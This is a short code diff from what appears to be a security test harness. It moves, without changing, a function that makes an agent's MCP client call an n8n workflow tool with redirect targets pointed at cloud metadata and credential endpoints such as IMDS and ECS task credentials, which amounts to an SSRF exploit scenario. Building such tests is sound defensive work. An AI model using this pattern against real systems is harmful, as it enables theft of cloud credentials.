@@ -43,6 +43,15 @@ KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identit
 BENIGN_TARGET = f"http://{N8N_INSTANCE_IP}:{N8N_PORT}/healthz"
 
 
+def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
+    async def run(places: Places, client: MCPClientPort) -> None:
+        place = places[place_id]
+        target = f"http://{place.coordinates.host}{place.coordinates.path}"
+        await client.call_tool("n8n_test_workflow", _trigger(target))
+
+    return run
+
+
 def _trigger(redirect_target: str) -> dict[str, object]:
     return {
         "workflowId": provisioned_workflow_id(),
@@ -52,15 +61,6 @@ def _trigger(redirect_target: str) -> dict[str, object]:
         "data": {"u": redirect_target},
         "waitForResponse": True,
     }
-
-
-def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
-    async def run(places: Places, client: MCPClientPort) -> None:
-        place = places[place_id]
-        target = f"http://{place.coordinates.host}{place.coordinates.path}"
-        await client.call_tool("n8n_test_workflow", _trigger(target))
-
-    return run
 
 
 async def _benign(places: Places, client: MCPClientPort) -> None:
